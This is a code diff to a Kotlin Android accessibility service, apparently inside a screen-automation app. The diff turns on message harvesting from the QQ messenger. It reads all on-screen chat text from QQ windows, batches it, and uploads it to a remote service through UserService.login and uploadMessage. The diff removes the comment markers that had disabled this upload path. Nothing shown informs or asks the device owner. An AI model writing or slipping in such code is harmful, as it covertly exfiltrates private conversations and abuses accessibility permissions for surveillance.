@@ -3,12 +3,15 @@ package li.songe.gkd.service
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.example.myapplication.network.UserService
 
 object QListener {
     private var lastRead = System.currentTimeMillis()
-    private var user = ""
-    private val messageList = ArrayList<String>()
+    private val currentMessageList = ArrayList<String>()
     private val allMessageList = ArrayList<String>()
+    private val uploadMessageList = ArrayList<String>()
+    private var defaultSleep = 1000 * 5
+    private var sleep = defaultSleep
     private var uploading = false
     private val TAG = "QListener"
 
@@ -17,19 +20,26 @@ object QListener {
         event: AccessibilityEvent?,
         rootInActiveWindow: AccessibilityNodeInfo?
     ) {
-        if ((System.currentTimeMillis() - lastRead) < 1000 * 5) return
+        if ((System.currentTimeMillis() - lastRead) < sleep) return
 
         val app = event?.packageName.toString()
         if (app != "com.tencent.mobileqq") return
-        if (messageList.size > 100 && !uploading) {
-            allMessageList.addAll(messageList)
-//            uploadMessage()
+        if (uploadMessageList.size > 100 && !uploading) {
+            allMessageList.addAll(uploadMessageList)
+            uploadMessage()
             if (allMessageList.size > 100 * 1000) allMessageList.clear()
         }
         rootInActiveWindow?.let {
             lastRead = System.currentTimeMillis()
             Log.d(TAG, "qq start")
             findAll(it, 0)
+            if (currentMessageList.contains("加号")) {
+                sleep = defaultSleep
+                uploadMessageList.addAll(currentMessageList)
+                currentMessageList.clear()
+            } else {
+                sleep = defaultSleep * 2
+            }
         }
     }
 
@@ -47,20 +57,32 @@ object QListener {
             }
             if (className == "android.widget.TextView") {
                 val message = node1.text?.toString() ?: ""
-                if (message == "浮窗") return
-
-//                addMessage(message)
+                addMessage(message)
                 Log.d(TAG, message)
             } else if (className == "android.widget.ImageView") {
                 val cuser = node1.contentDescription?.toString() ?: ""
-                if (user != cuser) {
-                    messageList.add(cuser)
+                if (cuser == "加号") {
+                    currentMessageList.add(cuser)
                     Log.d(TAG, cuser)
-                    user = cuser
                 }
             } else if (node1.childCount > 0) {
                 findAll(node1, level + 1)
             }
         }
+    }
+
+    private fun uploadMessage() {
+        uploading = true
+        var liveMessage = "**********QQ**********"
+        uploadMessageList.map { liveMessage = "$liveMessage\n$it" }
+        uploadMessageList.clear()
+        uploading = false
+        UserService.login {
+            UserService.uploadMessage(it, liveMessage)
+        }
+    }
+
+    private fun addMessage(message: String) {
+        currentMessageList.add(message)
     }
 }
